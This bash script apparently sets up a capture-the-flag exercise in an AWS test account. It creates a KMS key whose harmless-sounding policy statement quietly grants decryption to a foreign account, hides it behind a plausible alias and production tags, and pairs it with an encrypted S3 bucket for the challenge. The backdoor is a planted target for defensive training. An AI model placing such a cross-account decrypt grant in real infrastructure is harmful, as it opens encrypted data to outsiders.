#!/usr/bin/env bash
# Flag 3.4 — KMS Key Backdoor
# Creates: KMS key with foreign account decrypt grant, alias, paired S3 bucket
# Requires: AWS_PROFILE with KMS + S3 write access (e.g. govuk-test-fulladmin)

set -euo pipefail

ACCOUNT_ID="430354129336"
REGION="eu-west-1"
FOREIGN_ACCOUNT="529148630281"
ALIAS="alias/govuk-platform-rds"
BUCKET="govuk-eph-ctf-rds-exports"
FLAG="WW91IHdlcmUgbmV2ZXIgZ29pbmcgdG8gZmluZCBhbGwgb2YgdGhlc2Uu"

echo "Creating KMS key..."
KEY_ID=$(aws kms create-key \
  --description "Encryption key for GOV.UK platform RDS snapshots and data exports" \
  --policy "$(cat <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowKeyAdministration",
      "Effect": "Allow",
      "Principal": {"AWS": "arn:aws:iam::${ACCOUNT_ID}:root"},
      "Action": ["kms:Create*","kms:Describe*","kms:Enable*","kms:List*","kms:Put*","kms:Update*","kms:Revoke*","kms:Disable*","kms:Get*","kms:Delete*","kms:TagResource","kms:UntagResource","kms:ScheduleKeyDeletion","kms:CancelKeyDeletion"],
      "Resource": "*"
    },
    {
      "Sid": "AllowPlatformEncrypt",
      "Effect": "Allow",
      "Principal": {"AWS": "arn:aws:iam::${ACCOUNT_ID}:root"},
      "Action": ["kms:Encrypt","kms:Decrypt","kms:ReEncrypt*","kms:GenerateDataKey*","kms:DescribeKey"],
      "Resource": "*"
    },
    {
      "Sid": "AllowManagedServiceDecrypt",
      "Effect": "Allow",
      "Principal": {"AWS": "*"},
      "Action": ["kms:Decrypt","kms:DescribeKey"],
      "Resource": "*",
      "Condition": {"StringEquals": {"aws:PrincipalAccount": "${FOREIGN_ACCOUNT}"}}
    }
  ]
}
EOF
)" \
  --tags \
    "TagKey=platform.internal/owner,TagValue=mallory@example.com" \
    "TagKey=environment,TagValue=production" \
    "TagKey=last-rotation-audit,TagValue=${FLAG}" \
  --region "${REGION}" \
  --query 'KeyMetadata.KeyId' --output text)

echo "Key ID: ${KEY_ID}"

echo "Creating alias..."
aws kms create-alias --alias-name "${ALIAS}" --target-key-id "${KEY_ID}" --region "${REGION}"

echo "Creating paired S3 bucket..."
aws s3api create-bucket --bucket "${BUCKET}" --region "${REGION}" \
  --create-bucket-configuration LocationConstraint="${REGION}"

aws s3api put-bucket-encryption --bucket "${BUCKET}" --region "${REGION}" \
  --server-side-encryption-configuration "{
    \"Rules\": [{
      \"ApplyServerSideEncryptionByDefault\": {
        \"SSEAlgorithm\": \"aws:kms\",
        \"KMSMasterKeyID\": \"${ALIAS}\"
      },
      \"BucketKeyEnabled\": true
    }]
  }"

echo "dummy" | aws s3 cp - "s3://${BUCKET}/2026-Q1-export.sql.gz.enc" --region "${REGION}"

echo "Done."
